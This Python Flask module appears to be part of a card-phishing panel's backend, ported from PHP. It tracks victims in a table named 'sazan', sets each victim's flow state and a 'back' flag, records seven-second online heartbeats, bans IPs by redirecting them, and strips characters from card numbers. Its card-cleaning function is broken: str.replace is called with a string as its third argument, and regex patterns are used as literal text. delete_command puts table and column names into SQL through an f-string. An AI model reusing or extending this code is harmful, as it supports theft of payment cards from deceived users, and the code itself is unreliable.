from __future__ import annotations

from datetime import datetime, timezone
from typing import Any, Optional

from flask import Request, redirect

from .config import BAN_REDIRECT_URL
from .database import get_cursor


CLIENT_IP_HEADERS = [
    "CF-Connecting-IP",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
]


def get_client_ip(request: Request) -> str:
    for header in CLIENT_IP_HEADERS:
        raw = request.headers.get(header)
        if raw:
            return raw.split(",")[0].strip()
    return request.remote_addr or ""


def enforce_ban(ip_address: str):
    if not ip_address:
        return None
    with get_cursor() as cursor:
        cursor.execute("SELECT 1 FROM ban WHERE ban=? LIMIT 1", (ip_address,))
        if cursor.fetchone():
            return redirect(BAN_REDIRECT_URL)
    return None


def update_flow_state(ip_address: str, state: str) -> None:
    if not ip_address:
        return
    with get_cursor() as cursor:
        cursor.execute("UPDATE sazan SET now=? WHERE ip=?", (state, ip_address))


def update_last_online(query_id: Optional[int], ip_address: str) -> None:
    if not ip_address:
        return
    expires_at = int(datetime.now(tz=timezone.utc).timestamp()) + 7
    with get_cursor() as cursor:
        cursor.execute("SELECT id FROM ips WHERE ipAddress=? LIMIT 1", (ip_address,))
        record = cursor.fetchone()
        if record:
            cursor.execute("UPDATE ips SET lastOnline=? WHERE ipAddress=?", (expires_at, ip_address))
        else:
            cursor.execute(
                "INSERT INTO ips (ipAddress, lastOnline) VALUES (?, ?)",
                (ip_address, expires_at),
            )
        if query_id:
            cursor.execute("UPDATE sazan SET lastOnline=? WHERE id=?", (expires_at, query_id))


def delete_command(table: str, column: str, value: str) -> None:
    with get_cursor() as cursor:
        cursor.execute(f"DELETE FROM {table} WHERE {column}=?", (value,))


def reset_back_flag(query_id: Optional[int]) -> None:
    if not query_id:
        return
    with get_cursor() as cursor:
        cursor.execute("UPDATE sazan SET back='0' WHERE id=?", (query_id,))


def tum_bosluklari_temizle(metin: str) -> str:
    """
    PHP'deki tum_bosluklari_temizle fonksiyonunun Python karşılığı.
    Kart numarasındaki tüm boşlukları ve özel karakterleri temizler.
    """
    metin = metin.replace("/s+/", "", metin)
    metin = metin.replace(" ", "", metin)
    metin = metin.replace(" ", "", metin)
    metin = metin.replace(" ", "", metin)
    metin = metin.replace("/s/g", "", metin)
    metin = metin.replace("/s+/g", "", metin)
    return metin.strip()
